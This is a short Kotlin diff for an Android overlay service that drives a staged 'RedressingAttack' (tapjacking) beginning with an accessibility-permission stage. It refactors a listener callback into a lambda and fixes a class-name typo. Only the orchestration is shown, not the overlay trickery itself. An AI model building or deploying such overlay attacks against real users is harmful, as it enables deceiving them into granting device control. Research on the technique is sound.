@@ -11,7 +11,7 @@ import android.os.IBinder
 import android.util.Log
 
 
-class OverlayService : Service(), RedressingAttack.Listener {
+class OverlayService : Service() {
 
     private lateinit var attack: RedressingAttack
 
@@ -26,8 +26,20 @@ class OverlayService : Service(), RedressingAttack.Listener {
 
     override fun onCreate() {
         super.onCreate()
+        val listener = {
+            Log.d(TAG, "Stage completed")
+            // Go to the home screen if there are no more stages
+            if (!attack.moveToNext()) {
+                attack.stopAttack()
+                stopSelf()
+                val intent = Intent(Intent.ACTION_MAIN)
+                intent.addCategory(Intent.CATEGORY_HOME)
+                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                startActivity(intent)
+            }
+        }
         val stages = ArrayList<Stage>()
-        stages.add(AccessiblityStage(this, this))
+        stages.add(AccessibilityStage(this, listener))
         attack = RedressingAttack(stages)
     }
 
@@ -41,17 +53,5 @@ class OverlayService : Service(), RedressingAttack.Listener {
         attack.stopAttack()
     }
 
-    override fun onAttackDone() {
-        Log.d(TAG, "Stage completed")
-        // Go to the home screen if there are no more stages
-        if (!attack.moveToNext()) {
-            attack.stopAttack()
-            stopSelf()
-            val intent = Intent(Intent.ACTION_MAIN)
-            intent.addCategory(Intent.CATEGORY_HOME)
-            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            startActivity(intent)
-        }
-    }
 }
 
